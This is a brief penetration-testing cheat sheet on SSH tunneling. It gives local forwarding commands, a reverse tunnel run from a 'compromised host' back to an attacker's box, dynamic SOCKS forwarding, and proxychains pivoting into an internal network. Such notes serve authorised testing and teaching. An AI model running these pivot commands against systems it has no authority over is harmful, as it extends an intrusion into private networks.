# SSH tunneling

## SSH tunneling <a id="ssh-tunneling"></a>

```csharp
ssh -l user -p port -N(dont execute remote cmd) -L:8000:127.0.0.1:64297 10.4.4.63(remote_ip)
```

### SSH reverse tunnel \(ie for irc\)

```csharp
ssh -L localhost_PORT:irc.freenode.net:6667 user@owned_server
ssh -L 9001:127.0.0.1:8082 polo@server
irssi -c localhost -p localhost_PORT
```

### Dynamic port Forwarding

* On compromised host :

```csharp
ssh -f -N -R 2222:127.0.0.1 b3v1l@MYBOX
```

* Then, on attacker machine:

```csharp
ssh -f -N -D 127.0.0.1:1028 -p 2222 user@127.0.0.1
```

* Then configure proxychains.conf

```csharp
root@kali:~/ proxychains ssh 10.1.1.1
ProxyChains-3.1 (
http://proxychains.sf.net
)
|S-chain|-<>-127.0.0.1:1028-<><>-10.1.1.1:22-<><>-OK
```

\`\`

